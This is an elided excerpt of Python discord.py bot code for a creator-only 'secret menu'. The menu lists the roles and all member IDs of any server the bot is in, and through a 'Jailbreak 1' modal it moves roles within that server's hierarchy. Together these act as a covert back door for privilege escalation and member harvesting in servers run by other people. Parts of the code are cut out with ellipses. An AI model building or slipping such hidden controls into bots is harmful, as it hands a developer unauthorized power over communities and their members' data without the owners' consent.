...
class MoveRolesServerModal(discord.ui.Modal, title="Move Roles"):
    ...
    async def on_submit(self, interaction: discord.Interaction):
        ...
        for r in roles:
            if bot_top and r.id == bot_top.id:
                mark = "🤖"  # bot highest role
            elif r.position < bot_pos:
                mark = "🔓"  # bot ABOVE this role → can manage
            else:
                mark = "🔐"  # bot BELOW this role → cannot manage
            lines.append(f"{mark} {r.name} (`{r.id}`)")
        desc = "\n".join(lines) if lines else "No roles."
        if len(desc) > 4000:
            desc = desc[:3990] + "\n…"
        embed = discord.Embed(title="IDK", description=desc, color=0x2f3136)
        embed.set_footer(text=f"{guild.name} · `{guild.id}` · 🔓 can manage · 🔐 cannot · 🤖 bot top")
        await interaction.response.send_message(
            embed=embed,
            view=HierarchyActionsView(guild.id),
            ephemeral=True,
        )
...
class Jailbreak1Modal(discord.ui.Modal, title="Jailbreak 1"):
    ...
    async def on_submit(self, interaction: discord.Interaction):
        ...
        # Only block the bot's highest role and managed/integration roles
        bot_top = me.top_role
        if role1.id == bot_top.id:
            return await interaction.response.send_message(
                "Cannot move the bot's highest role.", ephemeral=True
            )
        if role1.managed:
            return await interaction.response.send_message(
                "Cannot move a managed/integration role (roleID1).", ephemeral=True
            )
        ...
        # Bot can only place roles strictly below its top role
        ...
        try:
            if pos == "above":
                # role1 must end higher than role2
        ...
        # Refresh positions for confirm message
...
class HierarchyActionsView(discord.ui.View):
    def __init__(self, guild_id: int):
        super().__init__(timeout=300)
        self.guild_id = guild_id
    ...
    async def jailbreak1(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != CREATOR_ID:
            return await interaction.response.send_message("Creator only.", ephemeral=True)
        modal = Jailbreak1Modal(self.guild_id)
    ...
    async def show_users(self, interaction: discord.Interaction, button: discord.ui.Button):
        ...
        if guild is None:
            return await interaction.response.send_message("Server not found.", ephemeral=True)
        # Prefer cache; chunk if needed
        members = list(guild.members)
        if not members and guild.member_count and guild.member_count > 0:
            try:
                await guild.chunk()
                members = list(guild.members)
            except Exception:
        ...
        if not lines:
            desc = "No members cached."
            embeds = [discord.Embed(title="UserID list:", description=desc, color=0x2f3136)]
        else:
            embeds = []
            chunk, size = [], 0
            header = "UserID list:"
...
class SecretMenuView(discord.ui.View):
    ...
    @discord.ui.button(label="Move Roles", style=discord.ButtonStyle.secondary)
    async def move_roles(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != CREATOR_ID:
            return await interaction.response.send_message("Creator only.", ephemeral=True)
        await interaction.response.send_modal(MoveRolesServerModal())
